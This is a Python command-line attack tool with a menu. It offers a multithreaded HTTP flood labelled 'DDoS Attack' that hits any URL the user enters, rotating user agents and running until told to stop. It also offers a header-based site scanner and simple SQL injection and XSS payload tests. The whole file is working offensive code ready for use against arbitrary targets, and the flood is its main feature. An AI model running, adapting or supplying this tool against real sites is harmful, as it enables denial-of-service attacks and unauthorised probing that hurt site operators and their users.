import threading
import requests
import time
import random
import socket
import sys
from queue import Queue

global stop_flag
stop_flag = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def attack(target_url, delay, thread_id):
    global stop_flag
    count = 0
    while not stop_flag:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(target_url, headers=headers)
            count += 1
            if count % 10 == 0:
                print(f"[Thread {thread_id}] {count} requests sent - Last status: {response.status_code}", flush=True)
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}", flush=True)
        time.sleep(delay)

def scan_website(url):
    try:
        domain = url.split("//")[-1].split("/")[0]
        ip_address = socket.gethostbyname(domain)
        response = requests.get(url)
        server_header = response.headers.get('Server', 'Not found')
        technologies = response.headers.get('x-powered-by', 'Unknown')
        
        print("\nWebsite Scan Results:")
        print(f"URL: {url}")
        print(f"IP Address: {ip_address}")
        print(f"Server: {server_header}")
        print(f"Technology: {technologies}")
    except Exception as e:
        print(f"Error while scanning: {e}")

def sql_injection(target_url):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1' /*"]
    for payload in payloads:
        try:
            response = requests.get(f"{target_url}?id={payload}")
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[!] Possible SQL Injection vulnerability found with payload: {payload}")
            else:
                print(f"[+] Payload {payload} did not trigger an error.")
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

def xss_attack(target_url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        try:
            response = requests.get(f"{target_url}?q={payload}")
            if payload in response.text:
                print(f"[!] Possible XSS vulnerability found with payload: {payload}")
            else:
                print(f"[+] Payload {payload} did not trigger XSS.")
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

def print_menu():
    print("\nMAIN MENU")
    print("1. DDoS Attack")
    print("2. Website Scanner")
    print("3. SQL Injection Test")
    print("4. XSS Attack Test")
    print("5. Exit")
    sys.stdout.flush()

def fanxiety_tool():
    global stop_flag
    while True:
        print_menu()
        choice = input("Select an option: ")
        
        if choice == "1":
            print("Number of Threads (example: 100): ", end="", flush=True)
            thread_count = int(input())
            print("Target URL: ", end="", flush=True)
            target_url = input()
            print("Delay (seconds): ", end="", flush=True)
            delay = float(input())
            
            print("\nAttack started! Type 'stop' to end the attack.", flush=True)
            
            threads = []
            for i in range(thread_count):
                thread = threading.Thread(target=attack, args=(target_url, delay, i))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            while True:
                command = input()
                if command.lower() == "stop":
                    stop_flag = True
                    print("Stopping attack...", flush=True)
                    break
            
        elif choice == "2":
            print("Enter URL to scan: ", end="", flush=True)
            target_url = input()
            scan_website(target_url)
        
        elif choice == "3":
            print("Enter URL to test for SQL Injection: ", end="", flush=True)
            target_url = input()
            sql_injection(target_url)
        
        elif choice == "4":
            print("Enter URL to test for XSS: ", end="", flush=True)
            target_url = input()
            xss_attack(target_url)
        
        elif choice == "5":
            print("Exiting...")
            exit()
        
        else:
            print("Invalid option!")

if __name__ == "__main__":
    try:
        fanxiety_tool()
    except KeyboardInterrupt:
        print("\nProcess stopped.")
        exit()